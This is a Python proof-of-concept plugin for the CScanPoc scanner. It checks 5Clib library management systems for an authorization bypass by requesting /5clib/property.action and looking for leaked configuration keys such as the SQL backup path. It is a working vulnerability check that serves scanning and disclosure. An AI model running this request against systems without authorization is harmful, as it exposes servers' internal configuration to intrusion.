# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = '5Clib_0000'  # 平台漏洞编号，留空
    name = '五车图书管理系统 越权'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-10-26'  # 漏洞公布时间
    desc = '''
        五车图书管理系统 /5clib/property.action 越权漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0128686'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '5Clib(五车图书管理系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3d2d197c-efe9-40e1-b83f-2b4da71cd0b6'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/5clib/property.action'
            target = arg + payload

            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and 'DEFAULT_PDF_LIB_PATH' in res and 'DEFAULT_SQL_BACKUP_PATH' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n越权漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=target))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
